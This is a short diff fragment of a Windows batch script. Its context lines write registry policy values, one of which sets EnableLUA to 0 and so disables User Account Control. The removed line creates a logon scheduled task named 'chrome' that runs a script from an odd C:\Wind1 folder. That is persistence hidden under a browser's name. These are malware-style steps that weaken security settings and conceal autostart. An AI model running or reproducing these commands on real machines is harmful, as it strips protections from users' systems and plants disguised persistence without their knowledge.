@@ -34,7 +34,7 @@ REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v Disabl
 
 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 
-SchTasks /Create  /SC ONLOGON /TN "chrome"  /TR  C:\Wind1\runatstart.cmd
+
 
 
 @echo off 
